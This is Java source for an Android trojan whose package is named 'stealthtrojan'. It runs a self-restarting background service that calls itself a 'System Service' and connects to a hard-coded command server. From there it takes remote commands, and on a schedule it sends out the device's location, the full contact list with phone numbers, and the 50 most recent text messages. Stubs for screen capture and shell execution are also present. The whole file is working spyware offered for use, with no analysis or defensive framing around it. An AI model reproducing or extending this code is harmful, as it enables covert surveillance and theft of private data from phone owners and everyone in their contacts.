package com.stealthtrojan.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.IntentFilter;
import android.content.Intent;
import android.location.Location;
import android.location.LocationManager;
import android.location.Criteria;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import org.eclipse.paho.client.mqttv3.*;
import org.json.JSONObject;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;

import android.content.ContentResolver;
import android.provider.ContactsContract;
import android.provider.Telephony;

public class StealthService extends Service implements MqttCallback {

    private static final String TAG = "StealthService";
    private static final String CHANNEL_ID = "stealth_service";
    
    // 服务器配置
    private static final String MQTT_BROKER = "tcp://43.161.233.72:1883";
    private static final String SERVER_URL = "http://43.161.233.72:8000/api/v1";
    private static final String TOPIC_PREFIX = "stealthtrojan/";
    
    private MqttClient mqttClient;
    private ScheduledExecutorService scheduler;
    private AtomicBoolean isRunning = new AtomicBoolean(true);
    private AtomicBoolean isConnected = new AtomicBoolean(false);
    
    // 配置参数
    private static final int HEARTBEAT_INTERVAL = 15;  // 15秒心跳
    private static final int DATA_COLLECTION_INTERVAL = 5;  // 5分钟数据收集
    private static final int RECONNECT_INTERVAL = 10;  // 10秒重连间隔
    
    // 设备信息
    private String deviceId;
    private String deviceName;
    
    private Handler mainHandler = new Handler(Looper.getMainLooper());

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        
        // 生成设备ID
        deviceId = "android_" + android.provider.Settings.Secure.getString(
            getContentResolver(),
            android.provider.Settings.Secure.ANDROID_ID
        ).substring(0, 8);
        
        deviceName = Build.MODEL + "_" + Build.VERSION.SDK_INT;
        
        Log.d(TAG, "Service created with deviceId: " + deviceId);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        Notification notification = createNotification();
        startForeground(1, notification);
        
        // 初始化 MQTT 连接
        initializeMQTTWithRetry();
        
        // 启动数据收集
        startDataCollection();
        
        // 启动心跳
        startHeartbeat();
        
        Log.d(TAG, "StealthService started");
        
        // 返回 STICKY 确保服务被杀死后自动重启
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID, 
                "System Service", 
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("System service");
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm != null) {
                nm.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        
        return builder
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(Notification.PRIORITY_LOW)
            .setOngoing(true)
            .build();
    }

    // MQTT 连接，带重试
    private void initializeMQTTWithRetry() {
        scheduler = Executors.newScheduledThreadPool(3);
        
        // 连接重试任务 - 每10秒检查一次
        scheduler.scheduleAtFixedRate(() -> {
            if (!isConnected.get() && isRunning.get()) {
                connectMQTT();
            }
        }, 0, RECONNECT_INTERVAL, TimeUnit.SECONDS);
    }

    private void connectMQTT() {
        try {
            if (mqttClient != null && mqttClient.isConnected()) {
                return;
            }
            
            Log.d(TAG, "Connecting to MQTT broker: " + MQTT_BROKER);
            
            mqttClient = new MqttClient(MQTT_BROKER, deviceId, null);
            MqttConnectOptions options = new MqttConnectOptions();
            options.setCleanSession(true);
            options.setKeepAliveInterval(60);
            options.setConnectionTimeout(10);
            options.setAutomaticReconnect(false);  // 我们自己实现重连
            
            mqttClient.setCallback(this);
            
            mqttClient.connect(options);
            
            // 订阅命令主题
            mqttClient.subscribe(TOPIC_PREFIX + deviceId + "/command", 1);
            
            isConnected.set(true);
            Log.d(TAG, "MQTT connected successfully");
            
            // 发送注册消息
            registerDevice();
            
        } catch (Exception e) {
            isConnected.set(false);
            Log.e(TAG, "MQTT connection failed: " + e.getMessage());
        }
    }

    private void registerDevice() {
        try {
            JSONObject data = new JSONObject();
            data.put("device_id", deviceId);
            data.put("device_name", deviceName);
            data.put("device_type", "android");
            data.put("status", "online");
            data.put("android_version", Build.VERSION.SDK_INT);
            data.put("manufacturer", Build.MANUFACTURER);
            data.put("model", Build.MODEL);
            
            publishMessage("register", data.toString());
        } catch (Exception e) {
            Log.e(TAG, "Failed to register device", e);
        }
    }

    // 发送心跳
    private void startHeartbeat() {
        scheduler.scheduleAtFixedRate(() -> {
            if (isRunning.get()) {
                sendHeartbeat();
            }
        }, 0, HEARTBEAT_INTERVAL, TimeUnit.SECONDS);
    }

    private void sendHeartbeat() {
        try {
            JSONObject data = new JSONObject();
            data.put("device_id", deviceId);
            data.put("status", "online");
            data.put("timestamp", System.currentTimeMillis());
            data.put("battery", getBatteryLevel());
            
            publishMessage("heartbeat", data.toString());
        } catch (Exception e) {
            Log.e(TAG, "Heartbeat failed", e);
        }
    }

    private int getBatteryLevel() {
        try {
            Intent batteryIntent = registerReceiver(null, 
                new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra("level", -1);
                int scale = batteryIntent.getIntExtra("scale", -1);
                if (level >= 0 && scale > 0) {
                    return (int) ((level / (float) scale) * 100);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to get battery level", e);
        }
        return -1;
    }

    // 数据收集
    private void startDataCollection() {
        scheduler.scheduleAtFixedRate(() -> {
            if (isRunning.get() && isConnected.get()) {
                collectAndSendData();
            }
        }, 5, DATA_COLLECTION_INTERVAL, TimeUnit.MINUTES);
    }

    private void collectAndSendData() {
        try {
            JSONObject data = new JSONObject();
            data.put("device_id", deviceId);
            data.put("type", "data_collection");
            data.put("timestamp", System.currentTimeMillis());
            
            collectLocation(data);
            collectContacts(data);
            collectSMS(data);
            
            publishMessage("data", data.toString());
            
        } catch (Exception e) {
            Log.e(TAG, "Data collection failed", e);
        }
    }

    private void collectLocation(JSONObject data) {
        try {
            if (!checkPermission("android.permission.ACCESS_FINE_LOCATION")) return;
            
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            Criteria criteria = new Criteria();
            String provider = lm.getBestProvider(criteria, true);
            
            if (provider != null) {
                Location location = lm.getLastKnownLocation(provider);
                if (location != null) {
                    JSONObject locationObj = new JSONObject();
                    locationObj.put("lat", location.getLatitude());
                    locationObj.put("lng", location.getLongitude());
                    locationObj.put("accuracy", location.getAccuracy());
                    locationObj.put("time", location.getTime());
                    data.put("location", locationObj);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Location collection failed", e);
        }
    }

    private void collectContacts(JSONObject data) {
        try {
            if (!checkPermission("android.permission.READ_CONTACTS")) return;
            
            ContentResolver cr = getContentResolver();
            java.util.List<JSONObject> contacts = new java.util.ArrayList<>();
            
            android.database.Cursor cursor = cr.query(
                ContactsContract.Contacts.CONTENT_URI,
                new String[]{ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME},
                null, null, null
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject contact = new JSONObject();
                    String id = cursor.getString(0);
                    String name = cursor.getString(1);
                    
                    contact.put("name", name);
                    
                    // 获取电话号码
                    android.database.Cursor phoneCursor = cr.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id}, null
                    );
                    
                    if (phoneCursor != null && phoneCursor.moveToFirst()) {
                        String phone = phoneCursor.getString(
                            phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                        );
                        contact.put("phone", phone);
                        phoneCursor.close();
                    }
                    
                    contacts.add(contact);
                } while (cursor.moveToNext());
                cursor.close();
            }
            
            data.put("contacts", contacts);
        } catch (Exception e) {
            Log.e(TAG, "Contacts collection failed", e);
        }
    }

    private void collectSMS(JSONObject data) {
        try {
            if (!checkPermission("android.permission.READ_SMS")) return;
            
            ContentResolver cr = getContentResolver();
            java.util.List<JSONObject> messages = new java.util.ArrayList<>();
            
            android.database.Cursor cursor = cr.query(
                Telephony.Sms.CONTENT_URI,
                new String[]{"_id", "address", "body", "date", "type"},
                null, null, "date DESC LIMIT 50"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject msg = new JSONObject();
                    msg.put("address", cursor.getString(1));
                    msg.put("body", cursor.getString(2));
                    msg.put("date", cursor.getLong(3));
                    msg.put("type", cursor.getInt(4));
                    messages.add(msg);
                } while (cursor.moveToNext());
                cursor.close();
            }
            
            data.put("sms", messages);
        } catch (Exception e) {
            Log.e(TAG, "SMS collection failed", e);
        }
    }

    private boolean checkPermission(String permission) {
        return getPackageManager().checkPermission(permission, getPackageName()) 
               == android.content.pm.PackageManager.PERMISSION_GRANTED;
    }

    // MQTT 发布消息
    private void publishMessage(String type, String payload) {
        if (mqttClient != null && mqttClient.isConnected()) {
            try {
                String topic = TOPIC_PREFIX + deviceId + "/" + type;
                MqttMessage message = new MqttMessage(payload.getBytes("UTF-8"));
                message.setQos(1);
                mqttClient.publish(topic, message);
            } catch (Exception e) {
                Log.e(TAG, "Failed to publish message: " + type, e);
            }
        }
    }

    // MQTT 回调
    @Override
    public void connectionLost(Throwable cause) {
        isConnected.set(false);
        Log.e(TAG, "MQTT connection lost: " + cause.getMessage());
    }

    @Override
    public void messageArrived(String topic, MqttMessage message) throws Exception {
        Log.d(TAG, "Message arrived on topic: " + topic);
        
        String payload = new String(message.getPayload(), "UTF-8");
        Log.d(TAG, "Payload: " + payload);
        
        // 解析命令
        try {
            JSONObject json = new JSONObject(payload);
            String cmd = json.optString("command", "");
            JSONObject params = json.optJSONObject("params");
            
            mainHandler.post(() -> {
                executeCommand(cmd, params);
            });
        } catch (Exception e) {
            Log.e(TAG, "Failed to parse command", e);
        }
    }

    private void executeCommand(String cmd, JSONObject params) {
        try {
            switch (cmd) {
                case "CAPTURE_SCREEN":
                    Log.d(TAG, "Screenshot command received");
                    break;
                    
                case "GET_LOCATION":
                    collectLocation(new JSONObject());
                    break;
                    
                case "GET_CONTACTS":
                    JSONObject contactsData = new JSONObject();
                    collectContacts(contactsData);
                    publishMessage("contacts", contactsData.toString());
                    break;
                    
                case "GET_SMS":
                    JSONObject smsData = new JSONObject();
                    collectSMS(smsData);
                    publishMessage("sms", smsData.toString());
                    break;
                    
                case "EXECUTE_SHELL":
                    Log.d(TAG, "Shell command received");
                    break;
                    
                default:
                    Log.d(TAG, "Unknown command: " + cmd);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Command execution failed", e);
        }
    }

    @Override
    public void deliveryComplete(IMqttDeliveryToken token) {
        // 消息发送完成
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning.set(false);
        
        if (mqttClient != null) {
            try {
                mqttClient.disconnect();
                mqttClient.close();
            } catch (Exception e) {
                Log.e(TAG, "MQTT disconnect error", e);
            }
        }
        
        if (scheduler != null) {
            scheduler.shutdown();
        }
        
        Log.d(TAG, "Service destroyed");
    }
}

